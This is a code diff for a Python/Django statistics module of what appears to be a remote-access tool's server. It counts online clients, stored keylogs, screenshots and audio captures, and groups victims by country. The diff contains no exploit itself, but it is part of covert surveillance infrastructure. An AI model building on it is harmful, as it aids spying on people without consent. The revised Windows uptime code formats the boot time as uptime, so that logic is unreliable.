@@ -1,27 +1,42 @@
-import datetime, sys, subprocess
+import datetime, sys
+from ModeratServer.models import *
+from django.db.models import Count
+
 
 def get_uptime():
     if sys.platform.startswith('win'):
-        cmd = "net statistics server"
-        p = subprocess.Popen(cmd, shell=True,
-                             stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-        (child_stdin, child_stdout) = (p.stdin, p.stdout)
-        lines = child_stdout.readlines()
-        child_stdin.close()
-        child_stdout.close()
-        lines = [line.strip() for line in lines if line.strip()]
-        date, time, ampm = lines[1].split()[2:5]
-        m, d, y = [int(v) for v in date.split('/')]
-        H, M, _tmp = [int(v) for v in time.split(':')]
-        if ampm.lower() == 'pm':
-            H += 12
-        now = datetime.datetime.now()
-        then = datetime.datetime(y, m, d, H, M)
-        diff = now - then
-        uptime = diff
+        import wmi
+        wmiob = wmi.WMI()
+        sdata = wmiob.Win32_PerfFormattedData_PerfOS_System()
+        uptime = sdata[-1].SystemUpTime
+        tnow = datetime.datetime.now()
+        utime = datetime.timedelta(seconds=int(uptime))
+        boot = tnow - utime
+        uptime = "{} days, {} hours, {} minutes, {} seconds".format(boot.day, boot.hour, boot.minute, boot.second)
     else:
         with open('/proc/uptime') as f:
-            s = datetime.timedelta(seconds=float(f.readline().split()[0])).total_seconds()
-            uptime = '%d days, %d hours, %d minutes, %d seconds' % (
-                s // 86400, s // 3600 % 24, s // 60 % 60, s % 60)
+            boot = datetime.timedelta(seconds=float(f.readline().split()[0])).total_seconds()
+            uptime = '{} days, {} hours, {} minutes, {} seconds'.format(
+                boot // 86400, boot // 3600 % 24, boot // 60 % 60, boot % 60)
     return uptime
+
+
+def get_clients_moderators_informations():
+    total_clients = Clients.objects.all().count()
+    online_clients = Clients.objects.filter(status=True).count()
+    offline_clients = total_clients - online_clients
+    total_moderators = Moderators.objects.all().count()
+    online_moderators = Moderators.objects.filter(status=True).count()
+    offline_moderators = total_moderators - online_moderators
+    return total_clients, online_clients, offline_clients, total_moderators, online_moderators, offline_moderators
+
+
+def get_logs_information():
+    total_screenshots = Screenshots.objects.all().count()
+    total_keylogs = Keylogs.objects.all().count()
+    total_audios = Audios.objects.all().count()
+    return total_screenshots, total_keylogs, total_audios
+
+
+def get_clients_geo_location():
+    return Clients.objects.values('country').order_by('country').annotate(count=Count('country'))
